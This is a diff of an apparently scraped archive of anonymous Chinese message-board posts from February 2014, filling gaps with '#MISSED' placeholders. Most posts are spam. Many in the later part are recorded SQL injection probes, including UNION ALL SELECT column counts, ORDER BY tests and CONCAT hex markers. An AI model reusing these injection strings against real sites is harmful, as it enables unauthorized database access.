@@ -106,6 +106,9 @@ When I finally put myself together and made up my mind to give it a shot, you we
 #p 4266 2014-02-15 16:51:00 0 0
 树洞君这是被玩♂坏了么……(from web版http://rrurl.cn/ohgiky )
 
+#p 4265 2014-02-15 16:51:00 -1 -1
+#MISSED
+
 #p 4264 2014-02-15 16:00:00 0 2
 sadd(from web版http://rrurl.cn/ohgiky )
 
@@ -115,14 +118,41 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #c 450359978510416145 2014-02-15 16:13:00
 [陈嫣然] 妈蛋刷屏么…
 
+#p 4263 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4262 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4261 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4260 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4259 2014-02-15 16:00:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
 #p 4258 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4257 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4259 2014-02-15 16:00:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4256 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4255 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4254 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4253 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4252 2014-02-15 16:00:00 -1 -1
+#MISSED
 
 #p 4251 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -130,11 +160,26 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4250 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4249 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4248 2014-02-15 16:00:00 -1 -1
+#MISSED
+
 #p 4247 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4246 2014-02-15 16:00:00 -1 -1
+#MISSED
+
 #p 4245 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4244 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4243 2014-02-15 16:00:00 -1 -1
+#MISSED
 
 #p 4242 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -142,35 +187,56 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4241 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4241 2014-02-15 16:00:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
-
-#p 4241 2014-02-15 16:00:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4240 2014-02-15 16:00:00 -1 -1
+#MISSED
 
 #p 4239 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4238 2014-02-15 16:00:00 -1 -1
+#MISSED
+
 #p 4237 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4235 2014-02-15 16:00:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4236 2014-02-15 16:00:00 -1 -1
+#MISSED
 
 #p 4235 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4235 2014-02-15 16:00:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4234 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4233 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4232 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4231 2014-02-15 16:00:00 -1 -1
+#MISSED
+
+#p 4230 2014-02-15 16:00:00 -1 -1
+#MISSED
 
 #p 4229 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4228 2014-02-15 16:00:00 -1 -1
+#MISSED
+
 #p 4227 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4226 2014-02-15 16:00:00 -1 -1
+#MISSED
+
 #p 4225 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4224 2014-02-15 16:00:00 -1 -1
+#MISSED
 
 #p 4223 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -178,14 +244,35 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4222 2014-02-15 16:00:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4221 2014-02-15 16:00:00 -1 -1
+#MISSED
+
 #p 4220 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4219 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4218 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4217 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4216 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4215 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4214 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4213 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4212 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4211 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -193,22 +280,67 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4210 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4209 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4208 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4207 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4206 2014-02-15 15:59:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4205 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4204 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4203 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4202 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4201 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4200 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4199 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4198 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4197 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4198 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
-
 #p 4196 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4189 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4195 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4194 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4193 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4192 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4191 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4190 2014-02-15 15:59:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4189 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4188 2014-02-15 15:59:00 0 0
@@ -217,20 +349,38 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4187 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4187 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
-
-#p 4187 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
-
 #p 4186 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4185 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4184 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4183 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4182 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4181 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4180 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4179 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4178 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4177 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4176 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4175 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -238,17 +388,59 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4174 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4173 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4172 2014-02-15 15:59:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4171 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4170 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4169 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4168 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4167 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4166 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4165 2014-02-15 15:59:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4164 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4163 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4162 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4165 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4161 2014-02-15 15:59:00 -1 -1
+#MISSED
 
-#p 4163 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4160 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4159 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4158 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4157 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4156 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4155 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -256,41 +448,149 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4154 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4153 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4152 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4151 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4150 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4149 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4148 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4147 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4146 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4145 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4144 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4143 2014-02-15 15:59:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4142 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4141 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4140 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4139 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4138 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4137 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4136 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4137 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4135 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4134 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4133 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4132 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4131 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4130 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4129 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4128 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4127 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4126 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4125 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4124 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4123 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4122 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4121 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4120 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4119 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4118 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4117 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4116 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4115 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4114 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4113 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4112 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4111 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4110 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4109 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4108 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4107 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4106 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4105 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -298,11 +598,35 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4104 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4103 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4102 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4101 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4100 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4099 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4098 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4097 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4096 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4095 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4094 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4093 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -310,50 +634,167 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4092 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4091 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4090 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4089 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4088 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4087 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4086 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4085 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4084 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4083 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4082 2014-02-15 15:59:00 0 0
+sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4081 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4080 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4079 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4078 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4077 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
 #p 4076 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4077 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4075 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4074 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4073 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4072 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4071 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4070 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4069 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4068 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4067 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4066 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4065 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4064 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4063 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4062 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4061 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4060 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4059 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4058 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
-#p 4056 2014-02-15 15:59:00 0 0
-sadd(from web版http://rrurl.cn/ohgiky )
+#p 4057 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4056 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4055 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4054 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4053 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4052 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4051 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4050 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4049 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4048 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4047 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4046 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4045 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4044 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4043 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4042 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4041 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4040 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
+
+#p 4039 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4038 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4037 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
@@ -361,8 +802,32 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4036 2014-02-15 15:59:00 0 0
 sadd(from web版http://rrurl.cn/ohgiky )
 
+#p 4035 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4034 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4033 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4032 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4031 2014-02-15 15:59:00 0 0
 -7220%' UNION ALL SELECT 81,81,81,81,81,81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
+
+#p 4030 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4029 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4028 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4027 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4026 2014-02-15 15:59:00 0 0
 -3377%' UNION ALL SELECT 81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
@@ -370,8 +835,23 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4025 2014-02-15 15:59:00 0 0
 -6875%' UNION ALL SELECT 81,81,81-- (from web版http://rrurl.cn/ohgiky )
 
+#p 4024 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4023 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4022 2014-02-15 15:59:00 0 0
 -2740%' ORDER BY 5675-- (from web版http://rrurl.cn/ohgiky )
+
+#p 4021 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4020 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4019 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4018 2014-02-15 15:59:00 0 0
 -3878' UNION ALL SELECT 81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
@@ -379,20 +859,68 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 4017 2014-02-15 15:59:00 0 0
 -5193' UNION ALL SELECT 81,81,81-- (from web版http://rrurl.cn/ohgiky )
 
+#p 4016 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4015 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4014 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4013 2014-02-15 15:59:00 0 0
 -3264' ORDER BY 1-- (from web版http://rrurl.cn/ohgiky )
+
+#p 4012 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 4011 2014-02-15 15:59:00 0 0
 -9963') UNION ALL SELECT 81,81,81,81,81,81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
 
+#p 4010 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4009 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4008 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4007 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4006 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4005 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 4004 2014-02-15 15:59:00 0 0
 -9368') UNION ALL SELECT 81,81-- (from web版http://rrurl.cn/ohgiky )
+
+#p 4003 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 4002 2014-02-15 15:59:00 0 0
+-7817') ORDER BY 2516-- (from web版http://rrurl.cn/ohgiky )
 
 #p 4001 2014-02-15 15:59:00 0 0
 -6306') ORDER BY 1-- (from web版http://rrurl.cn/ohgiky )
 
-#p 4002 2014-02-15 15:59:00 0 0
--7817') ORDER BY 2516-- (from web版http://rrurl.cn/ohgiky )
+#p 4000 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3999 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3998 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3997 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3996 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3995 2014-02-15 15:59:00 0 0
 -5413 UNION ALL SELECT 81,81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
@@ -403,35 +931,116 @@ sadd(from web版http://rrurl.cn/ohgiky )
 #p 3993 2014-02-15 15:59:00 0 0
 -2097 UNION ALL SELECT 81,81,81-- (from web版http://rrurl.cn/ohgiky )
 
+#p 3992 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3991 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3990 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3989 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3988 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3987 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3986 2014-02-15 15:59:00 0 0
 -6072) UNION ALL SELECT 81,81,81,81,81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
+
+#p 3985 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3984 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3983 2014-02-15 15:59:00 0 0
 -2262) UNION ALL SELECT 81,81,81,81,81-- (from web版http://rrurl.cn/ohgiky )
 
+#p 3982 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3981 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3980 2014-02-15 15:59:00 0 0
 -8922) UNION ALL SELECT 81,81-- (from web版http://rrurl.cn/ohgiky )
+
+#p 3979 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3978 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3977 2014-02-15 15:59:00 0 0
 -7249) ORDER BY 1-- (from web版http://rrurl.cn/ohgiky )
 
+#p 3976 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3975 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3974 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3973 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3972 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3971 2014-02-15 15:59:00 0 0
 sadd%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
 
-#p 3967 2014-02-15 15:59:00 0 0
-sadd%' UNION ALL SELECT NULL#(from web版http://rrurl.cn/ohgiky )
+#p 3970 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3969 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3968 2014-02-15 15:59:00 0 0
 sadd%' UNION ALL SELECT NULL,NULL#(from web版http://rrurl.cn/ohgiky )
 
+#p 3967 2014-02-15 15:59:00 0 0
+sadd%' UNION ALL SELECT NULL#(from web版http://rrurl.cn/ohgiky )
+
+#p 3966 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3965 2014-02-15 15:59:00 0 0
 sadd%' ORDER BY 1#(from web版http://rrurl.cn/ohgiky )
+
+#p 3964 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3963 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3962 2014-02-15 15:59:00 0 0
 sadd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
 
+#p 3961 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3960 2014-02-15 15:59:00 0 0
 sadd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
+
+#p 3959 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3958 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3957 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3956 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3955 2014-02-15 15:59:00 0 0
 sadd' UNION ALL SELECT NULL#(from web版http://rrurl.cn/ohgiky )
@@ -439,14 +1048,50 @@ sadd' UNION ALL SELECT NULL#(from web版http://rrurl.cn/ohgiky )
 #p 3954 2014-02-15 15:59:00 0 0
 sadd' ORDER BY 3953#(from web版http://rrurl.cn/ohgiky )
 
+#p 3953 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3952 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3951 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3950 2014-02-15 15:59:00 0 0
 sadd') UNION ALL SELECT CONCAT(0x3a7673633a,0x4c795965536557757068,0x3a6a6b6b3a),81#(from web版http://rrurl.cn/ohgiky )
 
 #p 3949 2014-02-15 15:59:00 0 0
 sadd') UNION ALL SELECT 81,CONCAT(0x3a7673633a,0x5253586774796c745959,0x3a6a6b6b3a)#(from web版http://rrurl.cn/ohgiky )
 
+#p 3948 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3947 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3946 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3945 2014-02-15 15:59:00 -1 -1
+#MISSED
